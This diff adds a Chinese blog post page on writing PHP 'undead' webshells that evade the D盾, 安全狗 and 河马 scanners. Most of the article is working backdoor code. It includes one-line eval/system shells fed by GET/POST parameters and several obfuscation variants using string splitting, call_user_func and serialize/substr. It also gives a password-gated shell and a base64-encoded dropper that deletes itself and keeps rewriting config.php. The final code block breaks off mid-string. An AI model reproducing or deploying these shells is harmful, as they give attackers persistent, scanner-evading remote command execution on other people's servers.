@@ -1,0 +1,773 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.svg">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="white9ash">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="适用范围主要是丰富一下编写木马的一个经历。尝试一下绕过D盾、安全狗、河马。 基本概念php的不死马不算真正意义上的内存马，并非直接加载在内存中执行的，而是通过快速删除文件，让进程在内存中做死循环不断创建和删除木马本身，来达到‘不死’的目的。 原型分析">
+<meta property="og:type" content="article">
+<meta property="og:title" content="简单的php一句话免杀不死马编写">
+<meta property="og:url" content="http://white9ash.fun/2022/11/02/%E7%AE%80%E5%8D%95%E7%9A%84php%E4%B8%80%E5%8F%A5%E8%AF%9D%E5%85%8D%E6%9D%80%E4%B8%8D%E6%AD%BB%E9%A9%AC%E7%BC%96%E5%86%99/index.html">
+<meta property="og:site_name" content="white9ash&#39;blog">
+<meta property="og:description" content="适用范围主要是丰富一下编写木马的一个经历。尝试一下绕过D盾、安全狗、河马。 基本概念php的不死马不算真正意义上的内存马，并非直接加载在内存中执行的，而是通过快速删除文件，让进程在内存中做死循环不断创建和删除木马本身，来达到‘不死’的目的。 原型分析">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://white9ashpic.oss-cn-chengdu.aliyuncs.com/img/0.png">
+<meta property="og:image" content="https://white9ashpic.oss-cn-chengdu.aliyuncs.com/img/1.png">
+<meta property="og:image" content="https://white9ashpic.oss-cn-chengdu.aliyuncs.com/img/2.png">
+<meta property="og:image" content="https://white9ashpic.oss-cn-chengdu.aliyuncs.com/img/3.png">
+<meta property="og:image" content="https://white9ashpic.oss-cn-chengdu.aliyuncs.com/img/4.png">
+<meta property="article:published_time" content="2022-11-01T16:00:00.000Z">
+<meta property="article:modified_time" content="2023-02-20T15:40:19.037Z">
+<meta property="article:author" content="white9ash">
+<meta property="article:tag" content="免杀">
+<meta property="article:tag" content="php">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://white9ashpic.oss-cn-chengdu.aliyuncs.com/img/0.png">
+  
+  
+  
+  <title>简单的php一句话免杀不死马编写 - white9ash&#39;blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"white9ash.fun","root":"/","version":"1.9.4","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":"COMhCE96F35q0yVCpJzBObZb-MdYXbMMI","app_key":"OUD3nHH8v5VFszcsJe1RKDTjybOD4l5wG8rJeF465lcPwcEW","server_url":null,"path":"/","ignore_local":true}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+  
+
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Home</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="简单的php一句话免杀不死马编写"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2022-11-02 00:00" pubdate>
+          2022年11月2日 凌晨
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          123 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          2 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="leancloud-page-views-container" class="post-meta" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="leancloud-page-views"></span> 次
+        </span>
+        
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">简单的php一句话免杀不死马编写</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h3 id="适用范围"><a href="#适用范围" class="headerlink" title="适用范围"></a>适用范围</h3><p>主要是丰富一下编写木马的一个经历。尝试一下绕过D盾、安全狗、河马。</p>
+<h3 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h3><p>php的不死马不算真正意义上的内存马，并非直接加载在内存中执行的，而是通过快速删除文件，让进程在内存中做死循环不断创建和删除木马本身，来达到‘不死’的目的。</p>
+<h3 id="原型分析"><a href="#原型分析" class="headerlink" title="原型分析"></a>原型分析</h3><?php  
+set_time_limit(0);  
+ignore_user_abort(1);  
+unlink(__FILE__);  
+while (1) {  
+$content = '<?php @eval($_POST["w9s"]) ?>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>  <br><span class="hljs-title function_ invoke__">set_time_limit</span>(<span class="hljs-number">0</span>);  <br><span class="hljs-title function_ invoke__">ignore_user_abort</span>(<span class="hljs-number">1</span>);  <br><span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-keyword">__FILE__</span>);  <br><span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>) &#123;  <br>    <span class="hljs-variable">$content</span> = <span class="hljs-string">&#x27;&lt;?php @eval($_POST[&quot;w9s&quot;]) ?&gt;&#x27;</span>;  <br>    <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-string">&quot;config.php&quot;</span>, <span class="hljs-variable">$content</span>);  <br>    <span class="hljs-title function_ invoke__">usleep</span>(<span class="hljs-number">10000</span>);  <br>&#125;  <br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<ol>
+<li><code>set_time_limit()</code> — 设置脚本最大执行时间</li>
+</ol>
+<p>设置允许脚本运行的时间，单位为秒。如果超过了此设置，脚本返回一个致命的错误。默认值为30秒。最大的执行时间，单位为秒。如果设置为0（零），没有时间方面的限制。</p>
+<ol start="2">
+<li><p><code>ignore_user_abort(1)</code>函数设置与客户机断开是否会终止脚本的执行。该语句意味着用户停止访问该php文件时，php仍然执行。</p>
+</li>
+<li><p><code>unlink(_*FILE*_)</code> 删除该文件。</p>
+</li>
+<li><p><code>file_put_contents()</code> 函数把一个字符串写入文件中。</p>
+</li>
+<li><p><code>usleep()</code>函数延迟代码执行若干微秒。</p>
+</li>
+</ol>
+<h3 id="河马绕过思路"><a href="#河马绕过思路" class="headerlink" title="河马绕过思路"></a>河马绕过思路</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$cmd</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;w9s&#x27;</span>];<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b&#x27;</span>] &gt;= <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;s&#x27;</span>]) &#123;<br>  <span class="hljs-variable">$prefix</span> = <span class="hljs-string">&#x27;syst&#x27;</span>.<span class="hljs-string">&#x27;em(&quot;&#x27;</span>;<br>  <span class="hljs-variable">$suffix</span> = <span class="hljs-string">&#x27;&quot;);&#x27;</span>;<br>  <span class="hljs-variable">$shell</span> = <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-variable">$prefix</span>.<span class="hljs-variable">$cmd</span>.<span class="hljs-variable">$suffix</span>);<br>&#125;<br><span class="hljs-variable">$bypassCmd</span> = <span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$shell</span>);<br><span class="hljs-keyword">print</span>(<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$bypassCmd</span>));<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>河马可以通过字符串拼接和动态传参的方式绕过。</p>
+<h3 id="安全狗绕过思路"><a href="#安全狗绕过思路" class="headerlink" title="安全狗绕过思路"></a>安全狗绕过思路</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$cmd</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;w9s&#x27;</span>];<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getCmd</span>(<span class="hljs-params"><span class="hljs-variable">$cmd</span></span>)</span>&#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$cmd</span>);<br>&#125;<br><span class="hljs-keyword">eval</span>(<span class="hljs-title function_ invoke__">call_user_func</span>(<span class="hljs-string">&#x27;getCmd&#x27;</span>,<span class="hljs-variable">$cmd</span>));<br> <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>安全狗的检测与河马不同的一处是：有的时候只要<code>eval()</code>的参数是变量，就报毒，但并没有禁用<code>call_user_func()</code>函数，因此可以调用自定义函数绕过。</p>
+<h3 id="D盾绕过思路"><a href="#D盾绕过思路" class="headerlink" title="D盾绕过思路"></a>D盾绕过思路</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Cmder</span></span>&#123;<br>   <span class="hljs-keyword">var</span> <span class="hljs-variable">$w9s</span>;<br>   <span class="hljs-keyword">var</span> <span class="hljs-variable">$length</span>;<br>   <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$cmd</span> </span>) </span>&#123;<br>     <span class="hljs-variable language_">$this</span>-&gt;w9s = <span class="hljs-variable">$cmd</span>;<br>     <span class="hljs-variable language_">$this</span>-&gt;length = <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$this</span>-&gt;w9s);<br>   &#125;<br>&#125;;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getCmd</span>(<span class="hljs-params"><span class="hljs-variable">$cmd</span></span>)</span>&#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Cmder</span>(<span class="hljs-variable">$cmd</span>);<br>&#125;<br><span class="hljs-variable">$cmd</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;w9s&#x27;</span>];<br><span class="hljs-variable">$runer</span> = <span class="hljs-title function_ invoke__">getCmd</span>(<span class="hljs-variable">$cmd</span>);<br><span class="hljs-keyword">print</span>(<span class="hljs-title function_ invoke__">system</span>(<span class="hljs-title function_ invoke__">substr</span>((<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$runer</span>)),<span class="hljs-number">30</span>,<span class="hljs-variable">$runer</span>-&gt;length)));<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>D盾和河马差不多，主要通过变换进行绕过，光是substr使用一次即可绕过。但也可以做更复杂的变换，如反序列化等。上述的代码结合了两种的使用。</p>
+<h3 id="普通免杀一句话木马编写"><a href="#普通免杀一句话木马编写" class="headerlink" title="普通免杀一句话木马编写"></a>普通免杀一句话木马编写</h3><p>难点在于如何将几种方式运用在不同的地方，如何将这几种方式组合起来使用，主要的目的还是混淆变量的来源。这几款杀软都没有进行严格的语法树解析，所以要尽可能让变量的来源变得复杂（可以通过各种方式，类、函数返回、多重函数嵌套、序列化等）。需要注意的是无论是<code>call_user_func()</code>和<code>call_user_func_array()</code>函数的用法。以下是代码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">startCmd</span>(<span class="hljs-params"><span class="hljs-variable">$cmd</span></span>)</span>&#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Cmder</span>(<span class="hljs-variable">$cmd</span>);<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">cleanStr</span></span>&#123;<br>  <span class="hljs-keyword">var</span> <span class="hljs-variable">$newsystem</span> = <span class="hljs-string">&quot;sys&quot;</span>.<span class="hljs-string">&quot;tem&quot;</span>;<br>  <span class="hljs-keyword">var</span> <span class="hljs-variable">$serilCmd</span>;<br>  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$cmd</span></span>) </span>&#123;<br>    <span class="hljs-variable language_">$this</span>-&gt;serilCmd = <span class="hljs-variable">$cmd</span>;<br>  &#125;<br>&#125;<br><br><span class="hljs-variable">$cmd</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>];<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;pass&#x27;</span>])===<span class="hljs-string">&quot;df0f6c4b59db5fb7f4acf8b342994be0&quot;</span>) &#123;<br>  <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Cmder</span></span>&#123;<br>     <span class="hljs-keyword">var</span> <span class="hljs-variable">$command</span>;<br>     <span class="hljs-keyword">var</span> <span class="hljs-variable">$seril</span>;<br>     <span class="hljs-keyword">var</span> <span class="hljs-variable">$finalCmd</span>;<br>     <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$cmd</span></span>) </span>&#123;<br>       <span class="hljs-variable language_">$this</span>-&gt;command = <span class="hljs-variable">$cmd</span>;<br>       <span class="hljs-variable language_">$this</span>-&gt;seril = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">cleanStr</span>(<span class="hljs-variable">$this</span>-&gt;command);<br>       <span class="hljs-variable language_">$this</span>-&gt;finalCmd = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$this</span>-&gt;seril),<span class="hljs-number">39</span>,<span class="hljs-number">6</span>).<span class="hljs-string">&quot;(&#x27;&quot;</span>.<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$this</span>-&gt;seril),<span class="hljs-number">67</span>,<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$this</span>-&gt;command)).<span class="hljs-string">&quot;&#x27;)&quot;</span>;<br>     &#125;<br><br>     <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">evalCmd</span>(<span class="hljs-params"></span>)</span>&#123;<br>       <span class="hljs-keyword">eval</span>(<span class="hljs-variable language_">$this</span>-&gt;finalCmd.<span class="hljs-string">&quot;;&quot;</span>);<br>     &#125;<br>  &#125;<br><br>  <span class="hljs-variable">$cmdHandler</span> = <span class="hljs-title function_ invoke__">startCmd</span>(<span class="hljs-variable">$cmd</span>);<br>  <span class="hljs-variable">$noneMean</span> = <span class="hljs-title function_ invoke__">call_user_func_array</span>(<span class="hljs-keyword">array</span>(<span class="hljs-variable">$cmdHandler</span>,<span class="hljs-string">&#x27;evalCmd&#x27;</span>),<span class="hljs-keyword">array</span>());<br>&#125;<span class="hljs-keyword">else</span> &#123;<br>  <span class="hljs-keyword">exit</span>();<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>首先介绍一下两个类，Cmder类用于储存、变换、并执行用户的指令，$command用于储存指令、 $seril用于存储cleanStr对象实例、$finalCmd用于存放最终要执行的指令。cleanStr类用于存放’system’该字符串和用户的指令字符串方便后续用反序列化取出达到‘clean’混淆来源的作用。</p>
+<p>执行解析：</p>
+<p>木马的密码正好可以作为动态传参的一个点。当传入正确的密码和指令时，才会继续向下执行，否则退出。然后调用<code>startCmd()</code>函数创建一个对象实例并返回给变量<code>$cmdHandler</code> ,在创建实例的时候，<code>__construct()</code>函数会自动调用，创建cleanStr对象并使用serialize()和substr()函数来拼接最终需要执行的指令。接下来会调用call_user_func_array()函数间接执行Cmder中的eval()函数，起到命令执行的效果。</p>
+<p>执行效果：执行dir命令。三款杀软的查杀也没有报毒。</p>
+<img title="" src="https://white9ashpic.oss-cn-chengdu.aliyuncs.com/img/0.png" srcset="/img/loading.gif" lazyload alt="">
+
+<h3 id="不死马免杀一句话编写"><a href="#不死马免杀一句话编写" class="headerlink" title="不死马免杀一句话编写"></a>不死马免杀一句话编写</h3><p>将不死马的特点运用到上面的技巧中。不死马的特征本身是不会被检查的，真正有危害的是不断生成的php文件,只需要将不死马写入的文件，改成免杀的文件就行了。用base64编码一下，写入的时候在解码一下。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>  <span class="hljs-title function_ invoke__">set_time_limit</span>(<span class="hljs-number">0</span>);<br>  <span class="hljs-title function_ invoke__">ignore_user_abort</span>(<span class="hljs-number">1</span>);<br>  <span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-keyword">__FILE__</span>);<br>  <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>) &#123;<br>      <span class="hljs-variable">$content</span> = <span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-string">&#x27;PD9waHAKZnVuY3Rpb24gc3RhcnRDbWQoJGNtZCl7CiAgcmV0dXJuIG5ldyBDbWRlcigkY21kKTsKfQoKY2xhc3MgY2xlYW5TdHJ7CiAgdmFyICRuZXdzeXN0ZW0gPSAic3lzIi4idGVtIjsKICB2YXIgJHNlcmlsQ21kOwogIGZ1bmN0aW9uIF9fY29uc3RydWN0KCRjbWQpIHsKICAgICR0aGlzLT5zZXJpbENtZCA9ICRjbWQ7CiAgfQp9CgokY21kID0gJF9HRVRbJ2NtZCddOwppZiAobWQ1KCRfR0VUWydwYXNzJ10pPT09ImRmMGY2YzRiNTlkYjVmYjdmNGFjZjhiMzQyOTk0YmUwIikgewogIGNsYXNzIENtZGVyewogICAgIHZhciAkY29tbWFuZDsKICAgICB2YXIgJHNlcmlsOwogICAgIHZhciAkZmluYWxDbWQ7CiAgICAgZnVuY3Rpb24gX19jb25zdHJ1Y3QoJGNtZCkgewogICAgICAgJHRoaXMtPmNvbW1hbmQgPSAkY21kOwogICAgICAgJHRoaXMtPnNlcmlsID0gbmV3IGNsZWFuU3RyKCR0aGlzLT5jb21tYW5kKTsKICAgICAgICR0aGlzLT5maW5hbENtZCA9IHN1YnN0cihzZXJpYWxpemUoJHRoaXMtPnNlcmlsKSwzOSw2KS4iKCciLnN1YnN0cihzZXJpYWxpemUoJHRoaXMtPnNlcmlsKSw2NyxzdHJsZW4oJHRoaXMtPmNvbW1hbmQpKS4iJykiOwogICAgIH0KCiAgICAgZnVuY3Rpb24gZXZhbENtZCgpewogICAgICAgZXZhbCgkdGhpcy0+ZmluYWxDbWQuIjsiKTsKICAgICB9CiAgfQogIAogICRjbWRIYW5kbGVyID0gc3RhcnRDbWQoJGNtZCk7CiAgJG5vbmVNZWFuID0gY2FsbF91c2VyX2Z1bmNfYXJyYXkoYXJyYXkoJGNtZEhhbmRsZXIsJ2V2YWxDbWQnKSxhcnJheSgpKTsKfWVsc2UgewogIGV4aXQoKTsKfQo/Pg==&#x27;</span>);<br>      <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-string">&quot;config.php&quot;</span>, <span class="hljs-variable">$content</span>);<br>      <span class="hljs-title function_ invoke__">usleep</span>(<span class="hljs-number">10000</span>);<br>  &#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>实际上在填入base64编码后的不死马也会被安全狗某条规则命中导致被查杀，其他两款都不会检测到，所以再针对安全狗对不死马进行修改。有了上面的经验就知道安全狗用一个call_user_func()就可以绕过。所以最终版本如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>  <span class="hljs-title function_ invoke__">set_time_limit</span>(<span class="hljs-number">0</span>);<br>  <span class="hljs-title function_ invoke__">ignore_user_abort</span>(<span class="hljs-number">1</span>);<br>  <span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-keyword">__FILE__</span>);<br>  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">retStr</span>(<span class="hljs-params"></span>)</span>&#123;<br>    <span class="hljs-variable">$str</span>=<span class="hljs-string">&#x27;PD9waHAKZnVuY3Rpb24gc3RhcnRDbWQoJGNtZCl7CiAgcmV0dXJuIG5ldyBDbWRlcigkY21kKTsKfQoKY2xhc3MgY2xlYW5TdHJ7CiAgdmFyICRuZXdzeXN0ZW0gPSAic3lzIi4idGVtIjsKICB2YXIgJHNlcmlsQ21kOwogIGZ1bmN0aW9uIF9fY29uc3RydWN0KCRjbWQpIHsKICAgICR0aGlzLT5zZXJpbENtZCA9ICRjbWQ7CiAgfQp9CgokY21kID0gJF9HRVRbJ2NtZCddOwppZiAobWQ1KCRfR0VUWydwYXNzJ10pPT09ImRmMGY2YzRiNTlkYjVmYjdmNGFjZjhiMzQyOTk0YmUwIikgewogIGNsYXNzIENtZGVyewogICAgIHZhciAkY29tbWFuZDsKICAgICB2YXIgJHNlcmlsOwogICAgIHZhciAkZmluYWxDbWQ7CiAgICAgZnVuY3Rpb24gX19jb25zdHJ1Y3QoJGNtZCkgewogICAgICAgJHRoaXM&#x27;</span>.<span 